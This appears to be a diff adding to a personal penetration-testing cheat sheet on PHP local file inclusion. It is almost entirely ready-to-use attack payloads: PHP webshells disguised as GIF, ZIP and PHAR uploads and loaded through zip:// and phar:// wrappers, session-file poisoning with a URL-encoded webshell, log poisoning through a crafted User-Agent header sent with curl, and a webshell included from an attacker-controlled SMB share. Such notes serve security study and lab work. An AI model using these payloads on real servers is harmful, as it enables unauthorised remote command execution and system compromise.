@@ -62,3 +62,53 @@ Use SMB server:      better in internal network, as SMB could be restricted from
   http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
 
 
+File(shell) upload:
+  GIF:
+    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+    http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
+  ZIP:
+    echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+    http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+  PAR:
+    <?php
+    $phar = new Phar('shell.phar');
+    $phar->startBuffering();
+    $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+    $phar->setStub('<?php __HALT_COMPILER(); ?>');
+    
+    $phar->stopBuffering();
+
+    php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+    http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+
+
+  https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html
+
+
+Session poisoning:
+  dir:
+    /var/lib/php/sessions/
+    C:\Windows\Temp\
+
+  write url encoded webshell to session:
+    http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+  call session + id command:
+    http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+
+
+Log poisoning:
+  dir:
+    /var/log/apache2/
+    C:\xampp\apache\logs\
+
+    /var/log/nginx/
+    C:\nginx\log\
+
+  echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+  curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+  http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
+
+  more log dir:
+    /var/log/sshd.log
+    /var/log/mail
+    /var/log/vsftpd.log
